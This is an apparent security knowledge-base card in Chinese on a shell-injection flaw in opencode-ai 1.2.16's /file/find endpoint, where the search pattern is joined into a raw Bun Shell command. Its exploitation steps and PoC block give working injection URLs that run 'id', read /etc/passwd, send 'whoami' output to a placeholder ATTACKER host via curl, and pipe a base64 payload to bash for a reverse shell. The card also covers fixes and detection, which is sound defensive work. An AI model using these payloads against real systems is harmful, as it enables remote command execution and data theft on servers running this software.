---
id: web-nodejs-opencode-ai-file-find-raw-shell-injection
title: opencode-ai 1.2.16 /file/find：pattern 经 args.join 后进 ${{ raw }} 触发 shell 注入
type: scenario
domain: web
path: web/nodejs
technique: opencode-ai-ripgrep-raw-shell-injection
tags:
- nodejs
- bun
- command-injection
- opencode
- ripgrep
- raw-shell
- ctf
cve: []
severity: high
confidence: high
status: verified
affected_versions: opencode-ai 1.2.16（原文源码审计）
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V125
  verified_at: '2026-11-06T04:11:20+08:00'
  notes: '已对照原文截图核对：server/routes/file.ts 的 /find、Ripgrep.search 中 args.push(''--'') 后 args.join('' '')、$`${{ raw: command }}` 执行链与 ripgrep.ts:353 行号一致；affected_versions 已由作者按原文标为 opencode-ai 1.2.16；未实际运行 PoC。'
url: /docs/web/nodejs/web-nodejs-opencode-ai-file-find-raw-shell-injection/
draft: false
kb_aliases:
- opencode-ai
- /file/find
- Ripgrep.search
- Bun Shell raw
- ${{ raw }}
- pattern 命令注入
---

## 一句话结论

`opencode-ai@1.2.16` 的 `GET /file/find?pattern=...` 把用户 `pattern` 拼进 `args.join(" ")`，再用 Bun Shell 的 `${{ raw: command }}` 执行；`raw` 禁用转义，`;`、`|`、`$()` 等元字符会被 shell 解释，`--` 只保护 ripgrep 参数解析，挡不住 shell 注入。

## 原理

- **入口**：`server/routes/file.ts` 的 `/find` 用 `validator("query", z.object({ pattern: z.string() }))` 只校验类型，然后把 `pattern` 传给 `Ripgrep.search({ cwd: Instance.directory, pattern })`。
- **参数拼接**：`search()` 构造 `args = [filepath(), "--json", "--hidden", "--glob=!.git/*"]`，再 `args.push("--")`、`args.push(input.pattern)`，最后 `const command = args.join(" ")`。
- **危险执行**：`await $\`${{ raw: command }}\`.cwd(input.cwd).quiet().nothrow()`。Bun Shell 对 `${variable}` 默认做安全转义，但 `${{ raw: ... }}` 明确把内容原样交给 shell 解析。
- **为什么 `--` 无效**：`--` 只是 ripgrep 的参数分隔符；命令先被 `/bin/sh`（Bun Shell）解析，`;`、`|`、`&&`、反引号、`$()`、重定向都会在 ripgrep 启动前执行，`--` 根本轮不到 rg 解释。
- **为什么是字符串拼接**：原本数组形式 `args` 是安全的（每个元素一个 argv）；`join(" ")` 丢失了参数边界，再交给 shell 就变成可注入的命令串。
- **影响**：任意命令执行；`/file/find` 是 GET，配合 bot SSRF 或直接访问都能触发；无回显时可用 `curl http://attacker/$(whoami)` 外带。

## 触发条件

- 目标运行 `opencode-ai@1.2.16`（或同源代码版本），`/file/find` 可访问。
- 服务进程有执行 shell 的权限；`Instance.directory` 存在且可读。
- 攻击者能发 GET 请求（本机、内网或通过 bot SSRF）。
- 目标未在反向代理/WAF 层过滤 `;`、`|`、`$()` 等字符。

## 利用步骤

1. 确认版本/路由：请求 `/file/find?pattern=test`，观察是否返回 ripgrep JSON 或错误。
2. 用 `;` 注入简单命令：`/file/find?pattern=;id`。
3. 读取文件：`/file/find?pattern=;cat%20/etc/passwd`。
4. 带外确认：`/file/find?pattern=;curl%20http://ATTACKER/$(whoami)`。
5. 反弹 shell：把命令 base64 后 `echo <b64>|base64 -d|bash`，避免 URL 特殊字符。
6. 若通过 bot SSRF 触发，使用 GET + no-cors（见关联卡）。

## PoC

```bash
# 命令执行（有回显时）
curl "http://127.0.0.1:4096/file/find?pattern=;id"

# 管道
curl "http://127.0.0.1:4096/file/find?pattern=|id"

# 命令替换
curl "http://127.0.0.1:4096/file/find?pattern=\$(id)"

# 读文件
curl "http://127.0.0.1:4096/file/find?pattern=;cat%20/etc/passwd"

# 带外
curl "http://127.0.0.1:4096/file/find?pattern=;curl%20http://ATTACKER/$(whoami)"
```

## 变体与关联

- **元字符变体**：`;`、`|`、`||`、`&&`、反引号、`$()`、`>`/`>>`、换行。
- **同源变体**：任何把 argv 数组 `join(" ")` 后交给 `${{ raw }}`/`sh -c`/`bash -c` 的代码；数组直接传给 `spawn`/`execFile` 则安全。
- **入口变体**：GET query、POST body、文件名、glob、`--max-count` 等字段；只要进入同一个 `command` 字符串即可。
- **关联卡片**：[[web-nodejs-opencode-ai-worktree-startcommand-bash-rce]]（同产品另一处命令注入）、[[web-generic-ssrf-bot-pages-dev-allowlist-internal-service]]（GET 型内网触发）、[[web-nodejs-dokploy-destination-testconnection-rclone-command-injection]]（Node 命令拼接）、[[web-php-rce-command-space-blacklist-tab-passthru]]（命令注入绕过）。
- **边界**：若代码改为 `spawn("rg", args)` 或对 `pattern` 做严格 allowlist，注入不成立；`--` 不能替代 shell 转义。

## 检测与防御

- **修复**：不要把用户输入拼成 shell 命令；用 `spawn`/`execFile` 传 argv 数组，或使用 Bun Shell 的默认 `${}` 转义（不要 `raw`）。
- **输入校验**：对 `pattern` 做长度/字符 allowlist；禁止 `;|&$` 和反引号。
- **权限**：`/file/find` 加认证/授权，限制可搜索目录；服务以最小权限运行。
- **检测信号**：`/file/find` 的 `pattern` 含 shell 元字符；进程树出现 `sh -c`/`bash -c` 且子进程为 `id`、`curl`、`cat` 等；ripgrep 命令串异常。
